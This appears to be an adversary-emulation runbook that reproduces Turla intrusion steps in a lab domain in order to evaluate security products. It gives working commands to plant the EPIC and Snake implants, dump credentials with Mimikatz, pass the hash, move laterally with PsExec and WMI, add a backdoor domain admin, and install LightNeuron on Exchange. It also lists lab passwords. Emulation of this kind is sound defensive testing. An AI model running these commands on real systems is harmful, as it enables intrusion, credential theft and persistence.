# Snake Protections Scenario

Legend of symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something

---

## Protections Setup

:arrow_right: RDP, do not SSH, to the Kali attacker machine `(176.59.15.33)`.

* Open a new terminal window, cd to the cloned repo control server, and start the control server:

```bash
cd /opt/day2/turla/Resources/control_server
rm logs.txt
sudo ./controlServer -c ./config/turla_day2.yml
```

* Ensure the EPIC, Snake, and LightNeuron handlers started up.

* Within your Kali control server terminal window, right click and select
"Split Terminal Horizontally". Be careful not to terminate the control server.

* In the new terminal window, change directory to the control server repo:

```bash
cd /opt/day2/turla/Resources/control_server
```

<br>

## Test 8: Watering Hole

:microphone: `Voice Track:`

Test 8 emulates Turla's initial access attempt via a watering hole attack 
targeting user `Egle`, who downloads the EPIC dropper.

---

### :biohazard: Procedures

:arrow_right: RDP to `Azuolas (10.100.40.103)` as `Egle`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Egle  | Producer1! |

* Open Microsoft Edge and browse to `nato-int.com`.

* Wait for redirection to `anto-int.com`.

* After redirection you will prompted to update NotFlash. Click to download the
update (`NFVersion_5e.exe`) bundled with EPIC (a.k.a. Tavdig/Wipbot). ❗ DO NOT EXECUTE THE FILE.

* Open File Explorer and browse to Downloads

---

### :moyai: Source Code

* Watering Hole
  * [Browser redirection](../../Resources/setup/files/watering_hole/redirection.py#L18-L31)
  * Browser evercookie (utilized built-in [BeEF Evercookie](https://github.com/beefproject/beef/blob/486a9bb329f46e434e40c8e8567afa2754b37517/core/main/client/session.js#L15-L16) from the Browser Exploitation Framework)
  * [Fingerprinting details](../../Resources/setup/files/watering_hole/README.md#fingerprinting-details-from-beef-via-evercookie-and-other-bundled-tools)

### :microscope: Cited Intelligence

* <https://securelist.com/analysis/publications/65545/the-epic-turla-operation/>
* <https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
* <https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>
* <https://docs.broadcom.com/doc/waterbug-attack-group>
* <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
* <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/>
* <https://github.com/samyk/evercookie>

## Test 9: Execute EPIC

:microphone: `Voice Track:`

Test 9 emulates execution of the EPIC installer to achieve initial access and perform some discovery via the EPIC implant.

---

### :biohazard: Procedures

:arrow_right: Return to your Kali C2 server

* Open a new terminal tab and name it `smbclient`. Copy the EPIC dropper executable to Windows host, Azuolas:
```bash
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/EPIC/SimpleDropper/SimpleDropper/bin/SimpleDropper_https.exe Users\egle\Downloads\NFVersion_5e.exe'
```

:arrow_right: Return to your RDP session as `Egle`

* Open File Explorer > Downloads

* Double click on the downloaded `NFVersion_5e.exe` to run it.

* Wait 1 minute for it to finish running.

* Close out of all tabs and sign out of your RDP session.

* Re-RDP to `Azuolas (10.100.40.103)` as `Egle`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Egle  | Producer1! |

* Open Microsoft Edge and browse to `https://drebule.nk.local/owa`. Log in as `Egle`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Egle  | Producer1! |

:arrow_right: **Set a timer for 2 minutes** then switch to your Kali control server terminal and
confirm that a new implant has registered and the automated discovery output has been returned in
the server log.

**NOTE:** The injector will wait **2 minutes**, before injecting EPIC's Guard DLL into explorer.exe
and, subsequently, EPIC's worker DLL into Microsoft Edge. 


* Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server.

* In your lower terminal tab, task the EPIC implant with the following set of discovery commands:

```bash
cd /opt/day2/turla/Resources/control_server
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | systeminfo && net group "Domain Computers" /domain'
```

---

### :moyai: Source Code

* [EPIC Dropper](../../Resources/EPIC/SimpleDropper)
  * [File write of EPIC injector](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L34-L50)
  * [Registry modification](../../Resources/EPIC/SimpleDropper/SimpleDropper/Source.cpp#L95-L143)
* [EPIC Injector](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/)
  * Extract EPIC Guard DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L161-L193)
  * Targeting explorer.exe for [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective_injector/reflective_injector/Source.cpp#L199-L233)
* [EPIC Guard](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/)
  * Extract EPIC payload DLL from resources section [FindResourceW](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L161-L193)
  * Targeting svchost.exe for payload [DLL injection](../../Resources/EPIC/Defense-Evasion/reflective-guard/reflective-guard/dllmain.cpp#L235-L283)
* [EPIC Payload](../../Resources/EPIC/payload/) (in msedge.exe)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
  * User discovery [GetAllUsers](../../Resources/EPIC/payload/src/epic.cpp#L111-L182)
  * Directory discovery [DirectoryDiscovery](../../Resources/EPIC/payload/src/epic.cpp#L257-L298)
  * Write results to log file [WriteResults](../../Resources/EPIC/payload/src/epic.cpp#L311-L345)
  * C2 communications are:
    * [bzip2 compressed](../../Resources/EPIC/payload/src/comms.cpp#L462-L469)
    * [AES encrypted](../../Resources/EPIC/payload/src/comms.cpp#L483-L484)
    * [RSA encrypted AES key](../../Resources/EPIC/payload/src/comms.cpp#L487-L497)
    * [base64 encoded](../../Resources/EPIC/payload/src/comms.cpp#L505)
  * C2 communications are over [HTTPS](../../Resources/EPIC/payload/src/comms.cpp#L421-L458), [HTTPS specific flags](../../Resources/EPIC/payload/src/comms.cpp#L167-L196)

### :microscope: Cited Intelligence

* <https://securelist.com/analysis/publications/65545/the-epic-turla-operation/>
* <https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf>
* <https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf>
* <https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf>
* <https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf>
* <https://docs.broadcom.com/doc/waterbug-attack-group>
* <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
* <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/>


## Test 10: Install Snake on First Target

:microphone: `Voice Track:`

Test 10 emulates Turla exploiting a vulnerable driver to install the Snake rootkit 
on the `Azuolas` system and then performing discovery on `Azuolas` to
discover a file server and associated file server admin.

---

### :biohazard: Procedures

* :arrow_right: Switch to your RDP session to `azuolas` as `egle`.

* Open a Powershell prompt and run the following command:
```pwsh
runas /user:nk\egleadmin powershell
```
* When prompted, type in the password for `EgleAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\EgleAdmin | Producer1! |

* A new powershell window should pop up. Run the following command to ensure that you are running as `nk\EgleAdmin`:
```pwsh
whoami
```

:arrow_right: Return to your Kali C2 server terminal window

* From your `smbclient` Kali terminal tab, transfer the Snake installer to `Azuolas`.
```bash
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/payloads/epic/snake.exe Users\egle\Desktop\gusbsys.exe'
```

* :arrow_right: Switch to your RDP session to `azuolas` as `egle`.

* Open File Explorer and browse to Desktop

* From the `egle` (:heavy_exclamation_mark: NOT `egleadmin`) powershell terminal, run the following command to execute the Snake rootkit installer with the privilege escalation option:
```powershell
C:\Users\Egle\Desktop\gusbsys.exe -f
```

* Within the RDP session, go to your Edge window. Perform a hard refresh on the current page by pressing Ctrl+Shift+R.

:arrow_right: Return to your Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.

:arrow_right: Return to your Kali C2 server terminal window.

* From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:
```bash
# Discover running processes
cd /opt/day2/turla/Resources/control_server
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}'
```

* :heavy_exclamation_mark: Verify that the enumerated processes output contains a process running under `EgleAdmin`
```bash
grep 'NK\\EgleAdmin' logs.txt -i
```

> This should return output similar to the following:
>    ```
>    powershell.exe                2868 RDP-Tcp#6                  5     79,140 K Unknown         NK\egleadmin                                            0:00:00 N/A
>    conhost.exe                   7368 RDP-Tcp#6                  5     18,088 K Unknown         NK\egleadmin                                            0:00:00 N/A
>    ```

* Wait 1 minute then execute the next discovery command to enumerate `EgleAdmin`'s groups:
```bash
# Enumerate details on EgleAdmin to find group membership
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "user /domain EgleAdmin"}'
```
:heavy_exclamation_mark: Verify that `File Server Admins` is listed as one of the groups that `EgleAdmin` is a member of.

* Wait 1 minute then execute the next discovery command to the drive mapped to the file server:
```bash
# Discover that the local machine has a drive mapped to the file server
./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "use", "runas": "nk\\Egle"}'
```
:heavy_exclamation_mark: Verify that the home drive is mapped to the file server host `berzas (10.100.30.204)`.

---

### :moyai: Source Code

* EPIC
  * File download [DownloadFile](../../Resources/EPIC/payload/src/epic.cpp#L441-L466)
  * Execute commands [ExecCmd](../../Resources/EPIC/payload/src/epic.cpp#L47-L71)
* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L179)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [C2 communications over HTTP](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)

### :microscope: Cited Intelligence

* [Report 9: Securelist/Artemon- Uroburos](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2014/08/20082358/uroburos.pdf)
* [Report 10: BAE/Artemon- Snake](https://artemonsecurity.com/snake_whitepaper.pdf)
* [Report 11: GData- Uroburos](https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf)
* [Report 12: CIRCL- TR-25](https://www.circl.lu/pub/tr-25/)
* [Report 13: GData- Kernel Protection Mitigation](https://www.gdatasoftware.com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation)
* [Report 14: GData- using WinDbg](https://www.gdatasoftware.com/blog/2014/06/23953-analysis-of-uroburos-using-windbg)
* [Report 16: GData- Project Cobra](https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra)
* [Report 17: Tetrane- Uroburos with REVEN](https://blog.tetrane.com/2019/Analysis-Uroburos-Malware-REVEN.html)
* [Report 18: Talos- Snake Campaign](https://blog.talosintelligence.com/2014/04/snake-campaign-few-words-about-uroburos.html)
* [Report 19: Lastline- Dissecting Turla Rootkit](https://www.lastline.com/labsblog/dissecting-turla-rootkit-malware-using-dynamic-analysis/)
* [Report 20: Lastline- Kernel Exploit Makeover](https://www.lastline.com/labsblog/turla-apt-group-gives-their-kernel-exploit-a-makeover/)
* [Report 27: GitHub- hfiref0x/TDL](https://github.com/hfiref0x/TDL)
* [Report 28: CoreLabs- VirtualBox Privilege Escalation](https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability)
* [Report 29: Unit42- Acidbox](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)


## Test 11: Snake Lateral Movement to File Server

:microphone: `Voice Track:`

Test 11 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it, and then
using Powershell to perform Active Directory user, group, and computer discovery. 

---

### :biohazard: Procedures

:arrow_right: RDP into `berzas (10.100.30.204)` as `EgleAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\EgleAdmin  | Producer1! |

* Close any spurious windows

:arrow_right: Return to your Kali C2 server

* From your `smbclient` Kali terminal tab, copy PsExec and the second Snake installer to `Azuolas`.

```bash
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/PsExec.exe Windows\System32\file_svc_mgr.exe'
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/installer_v2.exe Windows\System32\cmu_svc_v2.exe'
```

:arrow_right: Return to your RDP session to `Azuolas (10.100.40.103)` as `Egle` and look for indications of vendor blocking activity.

* Open File Explorer and browse to `C:\Windows\System32`. Order files by date.

* In the :heavy_exclamation_mark: `EgleAdmin` Powershell terminal, run the following command to execute PsExec, which will run the Snake installer on the file server `berzas`:
```powershell
C:\Windows\System32\file_svc_mgr.exe \\berzas -accepteula -s -c "C:\Windows\System32\cmu_svc_v2.exe"
```

* Check both the `Egle` and `EgleAdmin` RDP windows for indications of the vendor blocking the activity.

:arrow_right: Return to your RDP session to `berzas (10.100.30.204)` as `EgleAdmin`

* Open Edge and navigate to <https://www.google.com>. Perform a search on `File server configuration best practices`, but don't click on any results.

:arrow_right: Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.

* From your lower Kali C2 control server terminal window, task Snake to check if the `ActiveDirectory` PowerShell module is installed.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}'
```
:heavy_exclamation_mark: Verify that you see output. If the implant returns empty output, please contact your lead.

* Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word "management", 
as members of these groups will likely have elevated permissions on the network.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}'
```
:heavy_exclamation_mark: Verify that `Server Management` is included in the results.

* Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Server Management` domain group. This will instruct Turla on users to target next.

```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}'
```
:heavy_exclamation_mark: Verify that `ZilvinasAdmin` shows up in the list of accounts.

* Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Domain Admins` domain group.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}'
```
:heavy_exclamation_mark: Verify that `ZilvinasAdmin` shows up in the list of accounts.

* Wait 1 minute before tasking Snake to discover domain users. Ensure
`Zilvinas` and `ZilvinasAdmin` appear in the output.
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}'
```

* Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).
```bash
./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}'
```
:heavy_exclamation_mark: Ensure that `Zilvinas' Workstation` appears in the `Description` field for `uosis`

---

### :moyai: Source Code

* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L179)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution via cmd](../../Resources/Snake/UserModule/src/execute.cpp#L337)
  * [Generic process execution with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)
  * [Powershell execution](../../Resources/Snake/UserModule/src/execute.cpp#L372)

### :microscope: Cited Intelligence

* <https://artemonsecurity.com/snake_whitepaper.pdf>

## Test 12: Credential Dumping, Lateral Movement, and Persistence

:microphone: `Voice Track:`

Test 12 emulates Turla performing credential dumping on the file server, and then performing lateral movement to the domain admin's workstation and performing additional persistence by creating a new domain admin account.

---

### :biohazard: Procedures

:arrow_right: Start a new RDP session to `uosis (10.100.40.102)` as `Zilvinas`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Zilvinas  | Producer2! |

* Click on the search bar and search for `powershell`. Right click `powershell` and then click "Run as Administrator".

* When prompted, type in the username and password for `ZilvinasAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\ZilvinasAdmin | Producer2! |

* A new powershell window should pop up. Run the following command to ensure that you are running as `nk\ZilvinasAdmin`:
```pwsh
whoami
```

:arrow_right: Return to your Kali C2 server

* From the `smbclient` Kali terminal tab, copy MimiKatz, PsExec, and the Snake installer, to the file server `berzas`:
```bash
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/mimikatz.exe Windows\System32\loadperf.exe'
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/PsExec.exe Windows\System32\fs_mgr.exe'
smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/installer_v3.exe Windows\System32\cmu_svc.exe'
```

:arrow_right: Go back to the RDP session to `Berzas (10.100.30.204)` as `EgleAdmin`:

* Open File Explorer and browse to C:\Windows\System32. Order files by date.

* Open command prompt (cmd) as an administrator. If prompted for credentials, use the following:

| Username      | Password |
| :--------:    | :---------------: |
| nk\EgleAdmin  | Producer1! |

* In the admin cmd prompt, run Mimikatz to dump all NTLM hashes from `LSASS.exe`:
```bat
C:\Windows\System32\loadperf.exe pr::d slsa::lop quit 
```
* :heavy_exclamation_mark: Verify that the password and NTLM hash for `ZilvinasAdmin` appears in the output.
  * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
  `* Username : ZilvinasAdmin`
  * You may have to go up a few results to find the hash and password
  * The output should contain:
  * >    ```
    >        * Username : ZilvinasAdmin
    >        * Domain   : NK
    >        * NTLM     : f3fcd61f987a97da49ce5f650b4e6539
    >        * SHA1     : fc8c801521140666c793108b67716caf4c4189f4
    >        * DPAPI    : b06d7bea8849897b811e1d73ab22726c
    >        tsPkG :	
    >    --
    >        * Username : ZilvinasAdmin
    >        * Domain   : NK
    >        * Password : Producer2!
    >        kErberoS :	
    >        * Username : ZilvinasAdmin
    >        * Domain   : NK.LOCAL
    >        * Password : (null)
    >        sSp :	
    >        crEdMan :
    >    ```

* Wait 1 minute and then in the same elevated cmd prompt, perform pass-the-hash via MimiKatz using `ZilvinasAdmin`'s NTLM hash to run PsExec and install Snake on the target workstation.
```bat
C:\Windows\System32\loadperf.exe pr::d "slsa::htp /user:ZilvinasAdmin /ntlm:f3fcd61f987a97da49ce5f650b4e6539 /domain:nk.local /remotepc:uosis /pexe:C:\Windows\System32\fs_mgr.exe /sys:1 /prun:C:\Windows\System32\cmu_svc.exe" quit
```

* Check both the `berzas (10.100.30.204)` and `uosis (10.100.40.102)` RDP
sessions for indicators of blocked activity.

:arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`:

* Open Edge and navigate to `https://drebule.nk.local/owa`. Log in as `Zilvinas`:

| Username   | Password |
| :--------: | :---------------: |
| nk\Zilvinas  | Producer2! |

* Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.

:arrow_right: Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server. 

* From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under `ZilvinasAdmin`.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}'
```
* :heavy_exclamation_mark: Verify that we find processes running under `ZilvinasAdmin`

```bash
grep 'NK\\ZilvinasAdmin' logs.txt -i 
```

> This should return output similar to the following:
>
>```
>powershell.exe                8152 RDP-Tcp#2                  3     83,280 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
>conhost.exe                    312 RDP-Tcp#2                  3     17,356 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
>```


* Wait 1 minute, then instruct Snake to create a new domain user `Leshy` using an access token from one of the `ZilvinasAdmin` processes. `Leshy` will be used as a backdoor domain admin account for persistence on the domain.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "nk\\zilvinasadmin"}'
```

* Wait 1 minute, then instruct Snake to add `Leshy` to the `Domain Admins` group.
```bash
./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net group \"Domain Admins\" leshy /add /domain", "runas": "nk\\zilvinasadmin"}'
```

### :moyai: Source Code

* [Snake Installer](../../Resources/Snake/SnakeInstaller/README.md)
  * [Privilege Escalation](../../Resources/Snake/SnakeInstaller/src/privesc/privesc.cpp#L179)
  * [Disable DSE and Load Rootkit](../../Resources/Snake/SnakeInstaller/src/main.cpp#L63)
  * [Start Snake Rootkit Driver](../../Resources/Snake/SnakeInstaller/src/driver/driver.cpp#L111)
* [Snake Rootkit](../../Resources/Snake/README.md)
  * [Driver](../../Resources/Snake/SnakeDriver/SnakeDriver/driver.c#L76)
  * [Function Hooking](../../Resources/Snake/SnakeDriver/SnakeDriver/hooks.c#L31)
    * [Infinity Hook](../../Resources/Snake/SnakeDriver/libinfinityhook/README.md)
  * [Drop DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/filesystem.cpp#L22)
  * [Trigger injection on network request](../../Resources/Snake/SnakeDriver/SnakeDriver/wfp.cpp#L276)
  * [Inject Usermodule DLL](../../Resources/Snake/SnakeDriver/SnakeDriver/inject.cpp#L30)
* [Snake Usermodule DLL](../../Resources/Snake/UserModule/README.md)
  * [C2 communications over HTTP](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task download](../../Resources/Snake/UserModule/src/comms_http.cpp#L237)
  * [Task execution for generic process](../../Resources/Snake/UserModule/src/execute.cpp#L406)
  * [Task execution via cmd with optional token impersonation](../../Resources/Snake/UserModule/src/execute.cpp#L337)
  * [Token duplication](../../Resources/Snake/UserModule/src/execute_token.cpp#L284)
  * [Payload download](../../Resources/Snake/UserModule/src/comms_http.cpp#L604)
  * [File Upload](../../Resources/Snake/UserModule/src/comms_http.cpp#L359)
* [Mimikatz](../../Resources/Mimikatz)

### :microscope: Cited Intelligence

* TBD

## Test 13: Lateral Movement to Exchange Server and LightNeuron Capabilities

:microphone: `Voice Track:`

Test 13 emulates Turla laterally moving to the Exchange server, installing the LightNeuron implant there, 
and sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic. 

---

### :biohazard: Procedures

:arrow_right: Start a new RDP session to `drebule (10.100.30.203)` as `ZilvinasAdmin`:

| Username   | Password |
| :--------: | :---------------: |
| nk\ZilvinasAdmin  | Producer2! |

:arrow_right: Return to your Kali C2 server

* In your Kali terminal window, copy the LightNeuron files to `uosis`
```bash
sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/ln_transport_agent.dll Windows\System32\mtxconf.dll'
sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/n_installer_aux.dll Windows\System32\mtxcli.dll'
sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/msiex.ps1 Windows\System32\msiex.ps1'
sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/rules.xml Windows\System32\wdr.rules.xml'
sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/winmail.dat Windows\System32\perfe009.dat'
```

:arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`

* Open File Explorer and browse to `C:\Windows\System32`. Order files by date.

* Start an elevated command prompt. When prompted for credentials, use:

| Username   | Password |
| :--------: | :---------------: |
| nk\ZilvinasAdmin  | Producer2! |

* In the elevated cmd prompt, run the following commands to copy LightNeuron files. After each command, check your RDP session to `drebule (10.100.30.203)` to look for any indicators of blocked vendor activity.
```bat
copy C:\Windows\System32\mtxconf.dll "\\drebule\C$\Program Files\Microsoft\Exchange Server\V15\TransportRoles\agents\Hygiene\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll"
```

* Wait 1 minute before copying the next file (LightNeuron companion DLL):
```bat
copy C:\Windows\System32\mtxcli.dll "\\drebule\C$\Program Files\Microsoft\Exchange Server\v15\bin\exdbdata.dll"
```

* Wait 1 minute before copying the next file (installation script):
```bat
copy C:\Windows\System32\msiex.ps1 \\drebule\C$\Windows\System32\msiex.ps1
```

* Wait 1 minute before copying the rules file:
```bat
copy C:\Windows\System32\wdr.rules.xml \\drebule\C$\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\msmdat.xml
```

* Wait 1 minute before copying the last config file:
```bat
copy C:\Windows\System32\perfe009.dat "\\drebule\C$\Program Files\Microsoft\Exchange Server\v15\bin\winmail.dat"
```

* Wait 1 minute and then run the following command in the elevated cmd prompt to install LightNeuron remotely using WMI and Powershell:
```
wmic /node:drebule /privileges:enable /output:STDOUT process call create "cmd.exe /c powershell.exe -File C:\Windows\System32\msiex.ps1 > C:\Windows\Temp\msiexinstallation.log 2>&1"
```
:heavy_exclamation_mark: Verify that the WMIC output shows a `ReturnValue` of 0.

* Check your RDP session to `drebule (10.100.30.203)` to look for any indicators of blocked activity.

:arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `ZilvinasAdmin`.

* Wait 1 minute and then run the following command in the elevated cmd prompt to check the installation log for any errors:
```bat
type \\drebule\C$\Windows\Temp\msiexinstallation.log
```
:heavy_exclamation_mark: If the output contains any errors, notify your lead.

:arrow_right: Return to your Kali C2 server

* From the Kali C2 lower terminal window, task LightNeuron to perform system
network configuration discovery:
```bash
./evalsC2client.py --set-task info@nk.local '5 | ipconfig /all'
```


* :heavy_exclamation_mark: If no response is received after 5 minutes, check
the postfix logs on the Kali server to make sure the email was intercepted and
processed correctly by LightNeuron.
  ```bash
  grep postfix /var/log/syslog
  ```
  * If there is a `reject` entry, that means the email, destined for a
  nonexistent user, was processed by the Exchange server, meaning that
  LightNeuron was either not successfully installed or is not working properly.
  
:arrow_right: Switch to your RDP session to `drebule (10.100.30.203)` to look
for any indicators of blocked activity.

* Open File Explorer and browse to `C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\Windows`
    * Confirm the presence of an `msxfer.dat`, this implies the LightNeuron
    transport agent was successfully installed and intercepted the email
    containing C2 commands

